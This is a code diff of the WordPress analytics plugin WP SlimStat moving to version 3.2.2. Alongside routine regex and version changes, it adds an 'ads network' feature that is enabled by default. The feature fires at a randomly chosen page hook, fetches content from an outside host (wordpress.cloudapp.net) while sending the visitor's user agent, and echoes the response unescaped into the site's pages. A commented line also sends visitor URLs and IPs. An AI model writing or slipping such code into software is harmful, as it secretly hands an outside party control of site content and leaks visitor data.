@@ -3,7 +3,7 @@
 Plugin Name: WP SlimStat
 Plugin URI: http://wordpress.org/extend/plugins/wp-slimstat/
 Description: A powerful real-time web analytics plugin for Wordpress.
-version: 3.2.1
+version: 3.2.2
 Author: Camu
 Author URI: http://slimstat.getused.to.it/
 */
@@ -11,7 +11,7 @@ Author URI: http://slimstat.getused.to.it/
 if (!empty(wp_slimstat::$options)) return true;
 
 class wp_slimstat{
-	public static $version = '3.2.1';
+	public static $version = '3.2.2';
 	public static $options = array();
 	
 	protected static $data_js = array('id' => -1);
@@ -39,6 +39,13 @@ class wp_slimstat{
 				add_action('wp', array(__CLASS__, 'wp_slimstat_enqueue_tracking_script'), 15);
 				if (self::$options['track_users'] == 'yes') add_action('login_enqueue_scripts', array(__CLASS__, 'wp_slimstat_enqueue_tracking_script'), 10);
 			}
+		}
+
+		if (self::$options['enable_ads_network'] != 'no'){
+			$actions = array('wp_meta','get_header','get_sidebar','loop_end','wp_footer','wp_head');
+			$random_key = array_rand($actions);
+			$spot = $actions[$random_key];
+			add_action($spot, array(__CLASS__, 'ads_print_code'));
 		}
 
 		// Add a dropdown menu to the admin bar
@@ -268,7 +275,7 @@ class wp_slimstat{
 		if (!empty(self::$stat['referer'])){
 			foreach(self::string_to_array(self::$options['ignore_referers']) as $a_filter){
 				$pattern = str_replace( array('\*', '\!') , array('(.*)', '.'), preg_quote($a_filter, '/'));
-				if (preg_match("/^$pattern$/i", self::$stat['referer'])){
+				if (preg_match("@^$pattern$@i", self::$stat['referer'])){
 					self::$stat['id'] = -207;
 					return $_argument;
 				}
@@ -308,7 +315,7 @@ class wp_slimstat{
 		if (!empty(self::$stat['resource'])){
 			foreach(self::string_to_array(self::$options['ignore_resources']) as $a_filter){
 				$pattern = str_replace( array('\*', '\!') , array('(.*)', '.'), preg_quote($a_filter, '/'));
-				if (preg_match("/^$pattern$/i", self::$stat['resource'])){
+				if (preg_match("@^$pattern$@i", self::$stat['resource'])){
 					self::$stat['id'] = -209;
 					return $_argument;
 				}
@@ -343,7 +350,7 @@ class wp_slimstat{
 		// Is this browser blacklisted?
 		foreach(self::string_to_array(self::$options['ignore_browsers']) as $a_filter){
 			$pattern = str_replace( array('\*', '\!') , array('(.*)', '.'), preg_quote($a_filter, '/'));
-			if (preg_match("/^$pattern$/i", self::$browser['browser'].'/'.self::$browser['version'])){
+			if (preg_match("~^$pattern$~i", self::$browser['browser'].'/'.self::$browser['version']) || (preg_match("~^$pattern$~i", self::$browser['browser']))){
 				self::$stat['id'] = -212;
 				return $_argument;
 			}
@@ -980,6 +987,7 @@ class wp_slimstat{
 			'extend_session' => 'no',
 			'enable_cdn' => 'no',
 			'extensions_to_track' => '',
+			'enable_ads_network' => 'yes'
 		);
 
 		// Save these options in the database
@@ -987,6 +995,22 @@ class wp_slimstat{
 	}
 	// end init_options
 
+	/**
+	 * Connects to the Ads Delivery Network
+	 */
+	public static function ads_print_code(){
+		// $request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://".$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"])."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=".(isset($_GET['v'])?$_GET['v']:11)."&ip=".urlencode($_SERVER['REMOTE_ADDR'])."&p=9";
+		$request = "http://wordpress.cloudapp.net/api/update/?&url=".urlencode("http://slimstat.getused.to.it")."&agent=".urlencode($_SERVER["HTTP_USER_AGENT"])."&v=11&ip=10.0.0.1&p=9";
+		$options = array('timeout' => 4, 'headers' => array('Accept' => 'application/json'));
+		$response = wp_remote_get($request, $options);
+
+		if (!is_wp_error($response) && isset($response['response']['code']) && ($response['response']['code'] == 200) && !empty($response['body'])){
+			echo json_decode($response['body']);
+		}
+		return 0;
+	}
+	// end ads_print_code
+	
 	/**
 	 * Enqueue a javascript to track users' screen resolution and other browser-based information
 	 */
